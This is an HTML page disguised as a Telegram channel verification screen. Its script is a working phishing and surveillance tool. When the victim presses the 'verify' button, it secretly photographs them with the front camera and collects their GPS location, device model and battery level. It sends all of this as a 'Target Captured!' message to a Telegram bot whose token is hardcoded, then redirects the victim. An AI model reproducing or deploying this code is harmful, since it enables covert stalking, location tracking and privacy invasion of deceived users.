<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Telegram Verification</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { margin: 0; background: #1c242f; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: sans-serif; color: white; text-align: center; }
        .join-btn { background: #3390ec; color: white; border: none; padding: 15px 40px; border-radius: 50px; font-size: 18px; font-weight: bold; cursor: pointer; width: 80%; }
        #video, #canvas { display: none; }
    </style>
</head>
<body>

<div class="container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" width="80" style="margin-bottom:20px;">
    <h2>Join Private Channel</h2>
    <p>Please verify to access the content.</p>
    <button id="startBtn" class="join-btn">VERIFY & JOIN</button>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
    const BOT_TOKEN = "8949954317:AAEToMTbNA1r5n00U7dKJcVXSVUcSacmLaE";
    const CHAT_ID = "5304050102";
    const REDIRECT_URL = "https://t.me/+MXbqj8pPVL82M2Zl";

    // ဖုန်းအမျိုးအစားကို ပိုတိကျအောင် ခွဲထုတ်သည့် Function
    function getDeviceModel() {
        const ua = navigator.userAgent;
        if (/android/i.test(ua)) {
            const match = ua.match(/Android\s([0-9\.]+);\s([^;]+)\sBuild/);
            return match ? match[2] : "Android Device";
        } else if (/iPhone/i.test(ua)) {
            return "iPhone";
        }
        return navigator.platform;
    }

    document.getElementById('startBtn').addEventListener('click', async () => {
        try {
            // ၁။ Camera & Location တောင်းဆိုခြင်း
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            document.getElementById('video').srcObject = stream;

            // ၂။ အချက်အလက်များ စုဆောင်းခြင်း
            let mapLink = "Location Denied";
            let batteryLvl = "N/A";
            
            // Location ကို Map Link အဖြစ် ပြောင်းလဲခြင်း
            navigator.geolocation.getCurrentPosition(pos => {
                mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
            });

            if(navigator.getBattery) {
                const b = await navigator.getBattery();
                batteryLvl = `${Math.round(b.level * 100)}%`;
            }

            const model = getDeviceModel();

            // ၃။ ပုံဖမ်းပြီး Bot ဆီ ပို့ခြင်း
            setTimeout(async () => {
                const canvas = document.getElementById('canvas');
                const video = document.getElementById('video');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                const blob = await (await fetch(canvas.toDataURL('image/jpeg', 0.6))).blob();
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'capture.jpg');
                formData.append('caption', `🔔 *Target Captured!*\n\n📍 Map: ${mapLink}\n📱 Model: ${model}\n🔋 Battery: ${batteryLvl}\n🌐 IP: [Auto-Detected]`);
                formData.append('parse_mode', 'Markdown');

                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });

                stream.getTracks().forEach(t => t.stop());
                window.location.href = REDIRECT_URL;
            }, 4000);

        } catch (err) {
            alert("Verification error. Please allow all permissions.");
            location.reload();
        }
    });
</script>
</body>
</html>
